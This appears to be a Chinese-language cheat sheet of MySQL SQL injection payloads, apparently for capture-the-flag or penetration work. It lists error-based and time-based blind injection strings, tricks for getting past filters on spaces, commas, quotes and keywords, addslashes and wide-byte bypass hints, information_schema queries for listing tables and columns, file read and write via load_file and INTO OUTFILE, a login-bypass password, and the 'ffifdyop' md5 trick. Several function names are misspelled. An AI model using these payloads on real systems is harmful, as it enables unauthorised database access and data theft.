[TOC]
### 注入方法相关
#### Error Based
* `and (select 1 from (select count(*),concat((inject here),floor(rand(0)*2))x from information_schema.tables group by x)a)`
* `and 1=(updatexml(1,concat(0x5e24,(inject here),0x5e24),1))`
* `and extractvalue(1, concat(0x5c, (inject here)))`

#### Time Based Blind
* `sleep(3)`
* `benchmark(10000000, sha1('true'))`

### 过滤
#### 空格过滤
* 注释代替空格 `/**/`
* 行注释回车替代空格（参见sqlmap tamper space2mysqldash）
* 其他符号代理空格 `%20 %09 %0d %0b %0c %0d %a0 %0a`
* 括号过滤 `()`

#### 逗号（,）过滤
使用join绕过：
```sql
UNION SELECT 1,2,3,4 FROM ...
```
```sql
UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN (SELECT 3)C JOIN (SELECT 4)D)
```
#### 引号（字符串）过滤
* 使用16进制
	`SELECT 0x61646D696E;`
* 使用CHAR函数
	`SELECT CHAR(97, 100, 109, 105, 110);`

#### 黑名单字符串
* 直接select
	`SELECT 'a' 'd' 'mi' 'n';`
* 使用concat
	`SELECT CONCAT('a', 'd', 'm', 'i', 'n');`
* 使用concat_ws
	`SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');`

#### 关键词过滤
* 双写
* 随缘大小写

### 绕过
#### addslashes
>  Returns a string with backslashes added before characters that need to be escaped. These characters are:
>
> * single quote (') ->\\'
* double quote (") -> \\"
* backslash (\\) -> \\\\
* NUL (the NUL byte) \\0

* 宽字节注入
* 格式化字符串漏洞

### 常用变量、函数
* `user()`
* `database()`
* `version()`
* `@@datadir()`
* `concat()`
* `grop_concat()`
* `hex() unhex()`
* `load_file()`
* `SELECT OOXX INTO OUTFILE ''`


### 字段位置备忘
#### 表名
* raw
```sql
SELECT GOUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database();
```
* union
```sql
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* 列出当前数据库中的表 */
UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出所有用户自定义数据库中的表 */
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
```
* blind
```sql
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
```
#### 列名
```sql
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
```
### 其他
#### 万能密码
* `'=0#`
	```sql
SELECT * FROM user WHERE username=''=0#';
	```

#### php
php中md5($password, true)的漏洞利用
```sql
SELECT * FROM user WHERE username=`admin` and password=md5($password, true)
```
password:`ffifdyop`
md5之后的字符串`'or'6<trash>`
